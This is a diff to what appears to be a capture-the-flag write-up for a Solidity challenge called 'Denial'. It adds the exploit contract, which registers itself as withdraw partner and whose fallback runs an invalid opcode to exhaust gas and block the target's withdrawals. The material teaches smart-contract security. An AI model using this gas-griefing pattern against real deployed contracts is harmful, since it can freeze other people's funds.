@@ -22,3 +22,14 @@ The `call` will send the empty `msg.data`. That means that our fallback will be 
 
 Therefore our exploit is now:
 
+```solidity
+constructor(Denial target) {
+        target.setWithdrawPartner(address(this));
+    }
+
+    fallback() external payable {
+        assembly {
+            invalid()
+        }
+    }
+```
